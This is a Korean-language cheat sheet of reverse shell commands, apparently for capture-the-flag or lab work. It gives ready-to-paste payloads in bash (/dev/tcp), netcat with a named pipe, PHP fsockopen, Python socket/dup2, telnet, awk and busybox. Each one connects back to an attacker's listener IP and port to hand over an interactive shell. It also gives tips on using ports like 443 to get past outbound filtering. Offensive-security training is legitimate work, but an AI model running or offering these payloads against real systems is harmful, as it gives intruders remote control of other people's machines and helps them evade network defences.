# reverse shell examples

## 리버스 셸 명령어 정리 (Reverse Shell Commands)

> 사용법: `10.8.136.212`=tun0 IP, `1234`=리스너 포트로 통째로 치환

### \# RS 전 ICMP 통신 체크

```sh
tcpdump -i tun0 icmp
# 설명: 특정 인터페이스(tun0)에서 인터넷 제어 메시지 프로토콜(ICMP) 통신을 모니터링합니다.
```

### \# step 1 start netcat

```sh
nc -lvnp 4444
# 설명: 넷캣(Netcat, nc) 리스너를 4444 포트에서 시작합니다.

python3 -m http.server 8000
# 설명: 파이썬 3 내장 모듈을 사용하여 8000 포트에서 HTTP 서버를 시작합니다.
```

> 4444 같은 포트는 아예 outbound 에서 막아버릴 수 있으므로 443, 8080, 80 같은 신뢰성 있는 포트로 대체 테스트 필요

### \# step 2 payload named a pipe reverse shell (Using a reverse or bind shell)

```sh
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 4444 >/tmp/f
# 설명: 명명 파이프(/tmp/f)를 이용해 셸(sh -i)과 넷캣(nc)을 연결하는 리버스 셸 페이로드입니다.
# 10.8.136.212=LHOST, 4444=LPORT 로 바꿔서 사용
```

### \# step 3 find flag

#### Bash

```sh
# 기본 (10.8.136.212=LHOST, 443=LPORT)
bash -i >& /dev/tcp/10.8.136.212/443 0>&1

# Read Line (비대화형)
exec 5<>/dev/tcp/10.8.136.212/443; cat <&5 | while read line; do $line 2>&5 >&5; done

# FD 196
0<&196;exec 196<>/dev/tcp/10.8.136.212/443; sh <&196 >&196 2>&196

# FD 5
bash -i 5<> /dev/tcp/10.8.136.212/443 0<&5 1>&5 2>&5
```

#### PHP

```php
# 방화벽 우회 (10.8.136.212=LHOST, 1234=LPORT)
php -r '$sock=fsockopen("10.8.136.212",1234);exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.8.136.212",1234);exec("/bin/bash <&3 >&3 2>&3");'

# 기타 함수
# shell_exec, system, passthru, popen
# 설명: exec와 유사하며, 각각 출력 방식만 다른 시스템 명령어 실행 함수입니다.
```

#### Python

```python
# 단계별 (LHOST/LPORT만 수정)
import socket
import subprocess
import os

LHOST = "10.8.136.212"
LPORT = 1234

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((LHOST, LPORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
```

```python
# 한줄용 (복사 바로 가능)
python3 -c '
import socket,subprocess,os
LHOST="10.8.136.212"; LPORT=1234
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((LHOST,LPORT))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
'
```

#### 기타

```sh
# Telnet (10.8.136.212=LHOST, 443=LPORT)
TF=$(mktemp -u); mkfifo $TF && telnet 10.8.136.212 443 0<$TF | sh 1>$TF

# AWK (Aho-Weinberger-Kernighan)
awk 'BEGIN {s = "/inet/tcp/0/10.8.136.212/1234"; while(42) { do{ printf "shell>" | & s; s | & getline c; if(c){ while ((c | & getline) > 0) print $0 | & s; close(c); } } while(c != "exit") close(s); }}' /dev/null
# 10.8.136.212=공격자IP, 1234=리스너포트

# BusyBox
busybox nc 10.8.136.212 443 -e sh
```

-----

## 리디렉션 정리

````text
- `>` : 표준 출력(Standard Output, stdout) 리디렉션
- `2>` : 표준 에러(Standard Error, stderr) 리디렉션
- `2>&1` : 표준 에러를 표준 출력과 동일하게 리디렉션 (순서 중요)
- `>&` : Bash에서 표준 출력/에러를 동시에 리디렉션 (예: `>& /dev/tcp/10.8.136.212/1234`)

### 예시

- `command > file.txt 2>&1` : 표준 출력/에러 모두 file.txt로
- `command >& file.txt` : 위와 동일 (Bash 한정)

---

## 요약

- `>&`는 `2>&1`의 간단 표기법 (Bash 전용)
- 리버스 셸에서 표준 입출력/에러를 모두 공격자에게 전달해야 완전한 양방향 통신 가능
- 복잡한 리디렉션은 공격자와의 완전한 셸 통신을 위해 필수

언어/명령,명령어 (COMMAND)

### 환경별 주요 명령어 (코드 블록)

# 환경에 따라 bash, nc, python, php 설치 여부가 다르므로 항상 된다는 보장이 없음 -> 다양한 RS 준비

```sh
# LHOST=10.8.136.212, LPORT=1234 로 통일
Python,python3 -c 'import socket,os,pty;LHOST="10.8.136.212";LPORT=1234;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((LHOST,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
Bash,bash -i >& /dev/tcp/10.8.136.212/1234 0>&1
PHP,"php -r '$sock=fsockopen(""10.8.136.212"",1234);exec(""/bin/sh -i <&3 >&3 2>&3"");'"
````

-----
